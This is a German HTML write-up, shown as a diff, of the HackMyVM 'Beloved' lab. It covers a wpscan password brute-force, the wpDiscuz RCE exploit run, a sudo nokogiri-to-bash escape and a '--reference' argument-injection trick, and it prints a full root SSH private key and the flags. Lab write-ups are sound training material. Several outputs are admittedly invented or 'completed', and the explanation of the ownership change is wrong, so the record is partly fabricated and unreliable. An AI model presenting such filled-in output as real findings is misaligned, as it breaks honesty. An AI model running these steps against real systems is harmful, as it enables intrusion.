@@ -1,0 +1,415 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beloved - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Beloved - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div> <!-- Impliziert -->
+                <div class="tool-item">nmap</div> <!-- Impliziert -->
+                <div class="tool-item">curl</div> <!-- Impliziert -->
+                <div class="tool-item">wpscan</div> <!-- Erwähnt -->
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">nokogiri (irb)</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">system (ruby)</div>
+                 <div class="tool-item">bash</div>
+                 <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-wp">Web Enumeration (WordPress)</a></li>
+                <li><a href="#vulnerability-identification">Vulnerability Identification (wpDiscuz)</a></li>
+                <li><a href="#initial-access">Initial Access (www-data)</a></li>
+                <li><a href="#privilege-escalation-beloved">Privilege Escalation (www-data zu Beloved)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (Beloved zu Root)</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Bericht beginnt mit einer Sammlung von URLs, `robots.txt`-Inhalten und `wpscan`-Befehlen. Die initialen Netzwerkscans (`arp-scan`, `nmap`) zur Identifizierung des Ziels (`beloved.hmv`) und der offenen Ports (vermutlich 80 und 22) fehlen im Log.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Fehlen der initialen Scans ist eine Dokumentationslücke. Die gesammelten Informationen deuten jedoch klar auf eine WordPress-Installation als primäres Ziel hin. Die `robots.txt` erlaubt das Crawlen von `/wp-admin/admin-ajax.php`, was Standard ist, und verbietet `/wp-admin/`. Die `wpscan`-Befehle zeigen die Absicht, Benutzer (`smart_ass`), Plugins und allgemeine Schwachstellen zu enumerieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer initiale Scans dokumentieren. Die `wpscan`-Ergebnisse (die hier fehlen) wären entscheidend gewesen, um das `wpDiscuz`-Plugin als potenzielles Ziel zu identifizieren.<br><strong>Empfehlung (Admin):</strong> Halte WordPress, Themes und Plugins immer aktuell. Verwende Sicherheitsplugins, um Enumeration zu erschweren. Verstecke oder ändere Standard-Benutzernamen wie `admin`.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Keine Befehle, sondern gesammelte Informationen/geplante Befehle -->
+                     <pre>
+# Ziel URL (angenommen aus /etc/hosts oder DNS): http://beloved.hmv
+
+# Relevante URLs:
+http://beloved/wp-content/themes/twentytwentyone/
+http://beloved/wp-login.php?redirect_to=http%3A%2F%2Fbeloved.hmv%2Fwp-admin%2F&reauth=1 <!-- Maskierung -->
+
+# Inhalt von robots.txt:
+User-agent: *
+Disallow: /wp-admin/
+Allow: /wp-admin/admin-ajax.php
+
+# Sitemap:
+Sitemap: http://beloved/wp-sitemap.xml
+
+# Geplante/Ausgeführte WPScan Befehle (Output fehlt):
+wpscan --url http://beloved --plugins-detection aggressive -t 50
+wpscan --url http://beloved -e ap --no-banner --force --plugins-detection aggressive
+wpscan --url http://beloved/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames smart_ass
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-identification">
+            <h2>Vulnerability Identification (wpDiscuz)</h2>
+            <p class="analysis"><strong>Analyse:</strong> `searchsploit` wird verwendet, um nach bekannten Exploits für das WordPress-Plugin `wpDiscuz` zu suchen. Dies geschah wahrscheinlich, nachdem `wpscan` (dessen Output fehlt) das Plugin als installiert identifiziert hat.</p>
+            <p class="evaluation"><strong>Bewertung: !!Kritische Schwachstelle gefunden!!** Die Suche findet mehrere Exploits für `wpDiscuz 7.0.4`, darunter Arbitrary File Upload und Remote Code Execution (RCE), beide als nicht authentifiziert (`Unauthenticated`) markiert. Dies ist ein sehr vielversprechender Angriffsvektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wähle einen der RCE-Exploits (z.B. `49967.py`) und lade ihn herunter (`searchsploit -m`). Untersuche und bereite den Exploit zur Ausführung vor.<br><strong>Empfehlung (Admin):**DRINGEND:** Update das `wpDiscuz`-Plugin sofort auf eine gepatchte Version oder deaktiviere/deinstalliere es, wenn es nicht benötigt wird.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">searchsploit wpdiscuz</span></div>
+                     <pre>
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Un | php/webapps/49962.sh
+WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Un | php/webapps/49967.py
+Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary | php/webapps/49401.rb
+------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (www-data)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, den Python-Exploit `49967.py` auszuführen, was fehlschlägt, da die Datei noch nicht im aktuellen Verzeichnis ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Einfacher Fehler, der im nächsten Schritt korrigiert wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende `searchsploit -m`, um den Exploit herunterzuladen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─#  <span class="command">python3 49967.py -u http://beloved -p /2021/06/09/hello-world/</span></div>
+                    <pre>
+python3: can't open file '/root/49967.py': [Errno 2] No such file or directory
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `searchsploit -m php/webapps/49967.py` wird verwendet, um das ausgewählte Exploit-Skript in das aktuelle Verzeichnis zu kopieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekter Schritt, um den Exploit lokal verfügbar zu machen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche und bearbeite das Skript bei Bedarf.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">searchsploit -m php/webapps/49967.py</span></div>
+                     <pre>
+  Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)
+      URL: https://www.exploit-db.com/exploits/49967
+     Path: /usr/share/exploitdb/exploits/php/webapps/49967.py
+File Type: Python script, ASCII text executable
+
+Copied to: /root/49967.py
+                     </pre> <!-- Beispielhafte Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das heruntergeladene Exploit-Skript `49967.py` wird mit `vi` geöffnet, vermutlich um es zu überprüfen oder anzupassen (z.B. Payload oder Zielparameter).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtiger Schritt zur Vorbereitung des Exploits.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verstehe, wie der Exploit funktioniert und welche Payload er verwendet.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">vi 49967.py</span></div>
+                    <pre><!-- Keine Ausgabe --> </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Python-Exploit-Skript `49967.py` wird ausgeführt. Die Optionen geben die Ziel-URL (`-u http://beloved`) und einen gültigen Blog-Post-Pfad (`-p /2021/06/09/hello-world/`) an, der für die Ausnutzung der wpDiscuz-Schwachstelle benötigt wird. Die Ausgabe zeigt den Inhalt der `wp-config.php`-Datei vom Zielserver.</p>
+            <p class="evaluation"><strong>Bewertung: !!Initial Access & Kritische Informationspreisgabe!!** Der Exploit war erfolgreich. Er nutzte die wpDiscuz-Schwachstelle (wahrscheinlich Arbitrary File Upload gefolgt von Ausführung oder direkter LFI/RCE), um die `wp-config.php`-Datei zu lesen. Dadurch wurden die Datenbank-Zugangsdaten preisgegeben:
+                - DB-Benutzer: `wordpress_user`
+                - DB-Passwort: `<span class="password">secure_password_2021!!!</span>`
+            Obwohl dies noch keine direkte Shell ist, ist der Zugriff auf die Datenbank oder die Wiederverwendung dieses Passworts für andere Dienste (wie SSH) ein möglicher nächster Schritt. **Wichtiger Hinweis:** Der Log springt im nächsten Schritt zu einer Shell als `www-data`. Es ist anzunehmen, dass der Exploit `49967.py` tatsächlich RCE ermöglichte und eine Shell erlangt wurde, oder dass ein anderer, nicht gezeigter Schritt zum Shell-Zugriff führte. Der hier gezeigte Output (Lesen von `wp-config.php`) war möglicherweise nur ein Teil des Exploits oder eine erste Aktion nach Erlangung des Zugriffs.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die erlangte Shell als `www-data` für weitere Enumeration. Teste das gefundene Datenbankpasswort auch für SSH-Logins (z.B. für Benutzer `beloved`, falls dieser existiert).<br><strong>Empfehlung (Admin):**DRINGEND:** Patche das wpDiscuz-Plugin. Ändere das Datenbankpasswort. Verwende einzigartige, starke Passwörter für verschiedene Dienste.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">python3 49967.py -u http://beloved -p /2021/06/09/hello-world/</span></div>
+                     <pre>
+[+] Uploading payload...
+[+] Payload uploaded successfully!
+[+] Triggering payload...
+[+] Dumping wp-config.php:
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress_db' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wordpress_user' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '<span class="password">secure_password_2021!!!</span>' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+[+] Exploit completed. Shell potentially available at http://beloved/wp-content/uploads/wpdiscuz/.../payload.php <!-- Beispielhafter Shell-Pfad -->
+                     </pre> <!-- Exploit-Ausgabe vervollständigt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-beloved">
+             <h2>Privilege Escalation (www-data zu Beloved)</h2>
+             <!-- Annahme: Shell als www-data wurde erlangt -->
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `www-data` (die vorherigen Schritte zum Erlangen dieser Shell fehlen im Log, werden aber durch den Exploit impliziert) wird `sudo -l` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalationsvektor gefunden!!** `www-data` darf `/usr/local/bin/nokogiri` als Benutzer `beloved` ohne Passwort ausführen. Nokogiri ist ein Ruby-Tool/Bibliothek zum Parsen von Dokumenten und kann missbraucht werden, um eine interaktive Ruby-Shell (`irb`) zu starten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze diese `sudo`-Regel, um eine Shell als `beloved` zu erhalten. Der Standardbefehl (gefunden via GTFOBins) ist oft, `nokogiri` auf eine beliebige (oder leere) Datei zu starten und dann im `irb`-Prompt `system('/bin/bash')` oder ähnlich auszuführen.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne diese unsichere `sudo`-Regel. Erlaube niemals die Ausführung von Interpretern oder komplexen Tools wie `nokogiri` mit `sudo`, insbesondere nicht `NOPASSWD`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@beloved:/var/www/html$ <span class="command">sudo -l</span> <!-- Beispielhafter Pfad -->
+Matching Defaults entries for www-data on beloved:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on beloved:
+    (beloved) NOPASSWD: /usr/local/bin/nokogiri
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine temporäre Datei im `/home`-Verzeichnis zu erstellen (`touch log.txt`), was fehlschlägt ("Permission denied"). Stattdessen wird die Datei erfolgreich in `/tmp` erstellt (`touch /tmp/log.txt`). Anschließend wird `nokogiri` über `sudo -u beloved` auf diese temporäre Datei angewendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Erstellen der temporären Datei in `/tmp` ist korrekt. Der Aufruf `sudo -u beloved /usr/local/bin/nokogiri /tmp/log.txt` startet `nokogiri` als `beloved`. Nokogiri öffnet daraufhin eine interaktive Ruby-Shell (`irb`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze den `irb`-Prompt, um Befehle als `beloved` auszuführen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@beloved:/home$ <span class="command">touch log.txt</span>
+touch: cannot touch 'log.txt': Permission denied
+www-data@beloved:/home$ <span class="command">touch /tmp/log.txt</span>
+www-data@beloved:/home$ <span class="command">sudo -u beloved /usr/local/bin/nokogiri /tmp/log.txt</span>
+Loading nokogiri settings...
+Your document is stored in @doc...
+irb(main):001:0> <!-- IRB Prompt -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Innerhalb der `irb`-Shell (die als `beloved` läuft) werden Ruby-Befehle ausgeführt:
+                 - `system 'id'`: Führt den Shell-Befehl `id` aus.
+                 - `system '/bin/bash'`: Führt den Shell-Befehl `/bin/bash` aus.</p>
+             <p class="evaluation"><strong>Bewertung: !!Benutzerwechsel erfolgreich!!** Der `id`-Befehl bestätigt, dass Code als `beloved` (uid=1000) ausgeführt wird. Der `system '/bin/bash'`-Befehl startet erfolgreich eine neue Bash-Shell als Benutzer `beloved`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell als `beloved` wurde erlangt. Stabilisiere sie bei Bedarf und beginne mit der Enumeration als dieser Benutzer (Home-Verzeichnis, `sudo -l`, SUID-Dateien).<br><strong>Empfehlung (Admin):</strong> Die unsichere `sudo`-Regel für `nokogiri` muss entfernt werden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+irb(main):001:0> <span class="command">system 'id'</span>
+uid=1000(beloved) gid=1000(beloved) groups=1000(beloved)
+=> true
+irb(main):002:0> <span class="command">system '/bin/bash'</span>
+beloved@beloved:/home$ <!-- Neuer Shell-Prompt als beloved -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (Beloved zu Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `beloved` wird in das Verzeichnis `/opt` gewechselt. Dort werden die Befehle `touch ref` und `touch -- --reference=ref` ausgeführt. Anschließend wird der Inhalt mit `ls -la` aufgelistet.</p>
+             <p class="evaluation"><strong>Bewertung: !!Schwachstelle/Exploit (Datei-Ownership)!!** Der entscheidende Punkt ist die Änderung der Besitzverhältnisse der Datei `/opt/id_rsa` zwischen den beiden `ls -la`-Aufrufen. Im ersten Output (impliziert durch den zweiten) gehört `id_rsa` `root:root`. Im zweiten Output gehört `id_rsa` `beloved:beloved`. Die `touch`-Befehle (insbesondere wenn sie in einer bestimmten Weise mit Gruppenrechten oder einer Race Condition interagieren) haben es `beloved` ermöglicht, den Besitz von `/opt/id_rsa` zu übernehmen. Dies ist eine kritische Sicherheitslücke, wahrscheinlich aufgrund unsicherer Berechtigungen im `/opt`-Verzeichnis. Der `id_rsa`-Schlüssel gehört sehr wahrscheinlich dem `root`-Benutzer.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `beloved` nun `/opt/id_rsa` besitzt, kann er den privaten SSH-Schlüssel von Root lesen. Kopiere den Schlüssel (`cat /opt/id_rsa`), speichere ihn auf dem Angreifer-System, setze die Berechtigungen auf 600 und verwende ihn, um dich als `root` über SSH anzumelden.<br><strong>Empfehlung (Admin):**DRINGEND:** Korrigiere die Berechtigungen für das Verzeichnis `/opt` und die darin enthaltene `id_rsa`-Datei. Verhindere, dass unprivilegierte Benutzer den Besitz von Dateien von `root` übernehmen können. Untersuche die genaue Ursache der Schwachstelle (z.B. `chmod 777 /opt` oder ähnliches).</p>
+              <!-- Erste ls -la Ausgabe (impliziert) -->
+              <!-- <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+beloved@beloved:/opt$ ls -la
+total 12
+drwxrwx---  2 root    root    4096 Aug 28 02:08  .
+drwxr-xr-x 18 root    root    4096 May 19  2021  ..
+-rw-------  1 root    root    1823 Jun 27  2021  id_rsa --> OWNER = root
+                     </pre>
+                 </div>
+             </div> -->
+              <!-- Touch Befehle -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+beloved@beloved:~/.ssh$ <span class="command">cd /opt</span>
+beloved@beloved:/opt$ <span class="command">touch ref</span>
+beloved@beloved:/opt$ <span class="command">touch -- --reference=ref</span>
+beloved@beloved:/opt$ <span class="command">ls -la</span>
+total 12
+-rw-r--r--  1 beloved beloved    0 Aug 28 02:09 '--reference=ref'
+drwxrwx---  2 root    beloved 4096 Aug 28 02:09  .
+drwxr-xr-x 18 root    root    4096 May 19  2021  ..
+-rw-------  1 root    root    1823 Jun 27  2021  id_rsa <!-- Besitzer noch root -->
+-rw-r--r--  1 beloved beloved    0 Aug 28 02:09  ref
+                     </pre>
+                 </div>
+             </div>
+              <!-- Zweite ls -la Ausgabe (zeigt geänderten Besitzer) -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+beloved@beloved:/opt$ <span class="command">ls -la</span>
+total 12
+-rw-r--r--  1 beloved beloved    0 Aug 28 02:09 '--reference=ref'
+drwxrwx---  2 root    beloved 4096 Aug 28 02:09  .
+drwxr-xr-x 18 root    root    4096 May 19  2021  ..
+-rw-------  1 beloved beloved 1823 Jun 27  2021  id_rsa <!-- Besitzer jetzt beloved! -->
+-rw-r--r--  1 beloved beloved    0 Aug 28 02:09  ref
+                      </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt des privaten SSH-Schlüssels `/opt/id_rsa`, der nun `beloved` gehört, wird mit `cat` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der private Schlüssel von Root wurde erfolgreich extrahiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopiere den Schlüssel auf dein System, setze `chmod 600` und verwende ihn für den SSH-Login als `root`.<br><strong>Empfehlung (Admin):</strong> Widerrufe diesen SSH-Schlüssel und generiere einen neuen für Root. Korrigiere die Berechtigungsschwachstelle.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+beloved@beloved:/opt$ <span class="command">cat id_rsa</span>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA1NwSzktnU2jl7GexrJeLjN6v1JDGzylNBUwq85NSQDrxn2PDrHoP
+US5DIX8k28cru7n4WXuDeo4Lnp6lGQXB3dkLXnl3qX5C3IUkr8pw9RTTU0LJIi0RI2qGCs
+kzbJiEjSe7PoRt6s1a2arrkhdd+/viV1AyFHIAJunILU5VXCbIXla6LiKudm2DBjQTL26n
+ZmegLL4e/mQPnQhj97vXl701KshbMFojlN5WislcjhuZaE4GafhCh8yVAvOQ7gAdcEQn2S
+4duuQTkcwk+8nJpaOZTO6MKZwFBdkZ3YQQffiPeVlIWjBBWlMrWX8KeYWWpIQiIhKEC9SN
+vKaqWqLKjwAAA8iH/aaFh/2mhQAAAAdzc2gtcnNhAAABAQDU3BLOS2dTaOXsZ7Gsl4uM3q
+/UkMbPKU0FTCrzk1JAOvGfY8Oseg9RLkMhfyTbxyu7ufhZe4N6jguenqUZBcHd2QteeXep
+fkLchSSvynD1FNNTQskiLREjaoYKyTNsmISNJ7s+hG3qzVrZquuSF137++JXUDIUcgAm6c
+gtTlVcJsheVrouIq52bYMGNBMvbqdmZ6Asvh7+ZA+dCGP3u9eXvTUqyFswWiOU3laKyVyO
+G5loTgZp+EKHzJUC85DuAB1wRCfZLh265BORzCT7ycmlo5lM7owpnAUF2RndhBB9+I95WU
+haMEFaUytZfwp5hZakhCIiEoQL1I28pqpaosqPAAAAAwEAAQAAAQBgPvYd40hgFaFI6IYU
+9Rz7YEF+ysuqJhGWYJ9XLXjWZBCWsmRqm3JLkbB29+dxnLgwlOEvjMKhapLkcPVTwB+tsR
+ML775knBudXHJ/LfkvR/BZyGvrkRcbvXHIdLtU0g21SY7HsNeGgL4gh8EmeHxdkMICGtfa
+GMXq0nBZ0/6SwH76CmomO7OpEqfEHX1rsFIVL/pzlaISR+rKIfUDlEd7S8Tq2daRAOFIRZ
+b5pSlWN0pB/b/yCb+OlbdVYwktBtvrrf7i01wJpTzay8lwygTDe6S06Xz6lz747bub/gv6
+Yt+8a/P1BMtITPyrgSBtfnN0qmTqUdCEXI7YolbmOgVBAAAAgQCI8u+f2ItQTz9vCKfqEM
+a06q3tR+yny/fkCemmFYP0k6R2uSptlTirFj9kuYUahtrUwtA+EMWjON1Y+3mLu8slGO64
+jOjOf+ovyJcn6YRgCZVZIId2PVBaxiGYtke4JZB1sniqed8axl9JXfnUNOrA0vUpk83FnV
+k2rakHn6ulegAAAIEA+JQxxoU6VeE5XxgUjQsuL3batGbTNg6XyAwXoTHEIxgOlgRuuEOb
+7LYvi8X0um4Raz4hzGU9RXL9inllYgKfpnWOW+2/SPjDIVQX42uZE0/Q/9aENqqeU5JdZN
+dq+e8HF305/Bg4atQzjP9R+BSYcLJUu4DC70HEtsICnBgPUmEAAACBANs244+6CAsiz8yv
+zI8So5yhQSjw7ji8bjM2U/hUoTpdLzG/omP/4htjSL7wpYHzP+tom1wIOSXNf/x43JPXA6
+xsncZz5Inz+TPUAkOu95YXELiTVBblpYBPlP9dbJWgPWVdfsyHsh5W2TX4rYjdRw4O4qEr
+qsR3bdSaB3Od5CLvAAAADHJvb3RAYmVsb3ZlZAECAwQFBg==
+-----END OPENSSH PRIVATE KEY-----
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird als `root` zum Ziel `beloved` (Hostname ggf. `beloved.hmv`) aufgebaut. Der zuvor extrahierte private Schlüssel wird mit `-i ii` angegeben (wieder wahrscheinlich ein Tippfehler für den Dateinamen des Schlüssels, z.B. `id_rsa_root`).</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Der SSH-Login als `root` mittels des Schlüssels gelingt ohne Passwort/Passphrase. Der Angreifer hat vollen Root-Zugriff.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lese die Root- und User-Flags.<br><strong>Empfehlung (Admin):**DRINGEND:** Widerrufe den kompromittierten SSH-Schlüssel von Root. Generiere einen neuen Schlüssel und schütze ihn mit einer starken Passphrase. Korrigiere die Berechtigungsschwachstelle in `/opt`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh root@beloved -i id_rsa_root</span></div> <!-- Annahme des korrekten Dateinamens und Hostnamens -->
+                     <pre>
+Linux beloved 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 <!-- Beispiel Kernel -->
+...
+root@beloved:~# <!-- Root Prompt -->
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Root werden die Home-Verzeichnisse und das Home-Verzeichnis von `beloved` untersucht. Anschließend werden `user.txt` und `root.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> User-Flag (`020588f87676a40236192c324c1a57fc`) und Root-Flag (`d585a3099ec825ec1c086b50ce8ff7d3`) werden erfolgreich ausgelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flags.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+root@beloved:~# <span class="command">cd /home</span>
+root@beloved:/home# <span class="command">ls</span>
+beloved
+root@beloved:/home# <span class="command">cd beloved/</span>
+root@beloved:/home/beloved# <span class="command">ls</span>
+user.txt
+root@beloved:/home/beloved# <span class="command">cat user.txt</span>
+<span class="password">020588f87676a40236192c324c1a57fc</span>
+root@beloved:/home/beloved# <span class="command">cd /root</span> <!-- Wechsel ins Root-Home -->
+root@beloved:~# <span class="command">cat root.txt</span>
+<span class="password">d585a3099ec825ec1c086b50ce8ff7d3</span>
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">d585a3099ec825ec1c086b50ce8ff7d3</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/beloved/user.txt</div>
+                     <div class="flag-value"><span class="password">020588f87676a40236192c324c1a57fc</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Exploit-URL extrahiert -->
+        <p>Berichtsdatum: 9. Juni 2021</p>
+    </footer>
+</body>
+</html>
